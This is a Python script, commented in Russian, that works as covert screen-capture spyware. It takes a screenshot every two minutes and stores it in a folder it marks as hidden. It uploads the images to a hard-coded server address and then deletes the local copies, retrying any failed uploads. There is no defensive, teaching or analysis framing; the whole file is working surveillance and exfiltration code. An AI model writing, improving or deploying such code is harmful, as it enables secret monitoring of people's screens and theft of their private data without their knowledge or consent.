import os
import requests
import shutil
import win32api
import win32con
from PIL import ImageGrab
import time
import keyboard

# задаем счетчик для названия файла
counter = 0
# задаем путь для сохранения скриншотов
directory = "D:/New Folder"
# задаем путь и имя файла для хранения списка непереданных скриншотов
pending_file = "pending.txt"

# если папка не существует, то создаем ее скрытой
if not os.path.exists(directory):
    os.makedirs(directory)
    win32api.SetFileAttributes(directory, win32con.FILE_ATTRIBUTE_HIDDEN)

# проверяем наличие файла со списком непереданных скриншотов
pending_files = []
if os.path.exists(pending_file):
    with open(pending_file, "r") as f:
        pending_files = f.read().splitlines()

while True:
    try:
       # делаем скриншот экрана
        im = ImageGrab.grab()
        # задаем имя файла
        filename = f"screenshot_{counter}.webp"
        # добавляем путь к имени файла
        filepath = os.path.join(directory, filename)
        # сохраняем скриншот как WEBP-изображения с сжатием на 30%
        im.save(filepath, "WEBP", quality=25)
        # увеличиваем счетчик
        counter += 1

        # добавляем путь и имя файла в список непереданных скриншотов
        pending_files.append(filepath)

        # отправляем файлы на сервер
        url = "http://192.168.137.108:5000/upload"
        for filepath in pending_files:
            files = {"file": open(filepath, "rb")}
            response = requests.post(url, files=files)
            response.raise_for_status()  # проверяем успешность запроса

            # Если файл был успешно отправлен, удаляем его из списка непереданных скриншотов
            pending_files.remove(filepath)

        # Если файлы были успешно отправлены, очищаем папку "New Folder"
        shutil.rmtree(directory)
        os.makedirs(directory)
        win32api.SetFileAttributes(directory, win32con.FILE_ATTRIBUTE_HIDDEN)

        # сохраняем список непереданных скриншотов в файл
        with open(pending_file, "w") as f:
            f.write("\n".join(pending_files))

        # ждем 120 секунд
        time.sleep(120)

    except Exception as e:
        # Если при отправке файлов возникает ошибка, сохраняем список непереданных скриншотов в файл
        # и пытаемся отправить их в следующий раз.
        print("Error:", e)
        with open(pending_file, "w") as f:
            f.write("\n".join(pending_files))
        # ждем 20 секунд
        time.sleep(20)

